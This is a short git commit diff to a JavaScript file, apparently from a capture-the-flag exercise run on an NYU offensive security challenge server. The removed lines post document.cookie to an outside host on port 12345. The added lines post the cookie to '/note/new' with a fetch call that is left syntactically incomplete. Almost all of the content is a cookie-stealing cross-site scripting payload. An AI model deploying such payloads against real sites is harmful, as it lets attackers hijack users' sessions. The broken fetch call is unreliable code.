1f005a69184e762cc559e911b979212aae25e0c6
Arti <123784674+wandaversion@users.noreply.github.com>
2024-04-09 22:16:52 -0400

    Update cslmnopg.js

--- cslmnopf.js
+++ cslmnopf.js
@@ -1,4 +1,2 @@
-var testsix = new XMLHttpRequest();
-testsix.open("POST", 'http://offsec-chalbroker.osiris.cyber.nyu.edu:12345/note/new');
-testsix.setRequestHeader('Content-Type', 'application/json');
-testsix.send(JSON.stringify({title: 'test 6', content: document.cookie, submit: 'save'}));
+fetch('/note/new', { method: 'POST',  
+    body: JSON.stringify({ title: 'exploit', content: document.cookie, submit: 'save' })
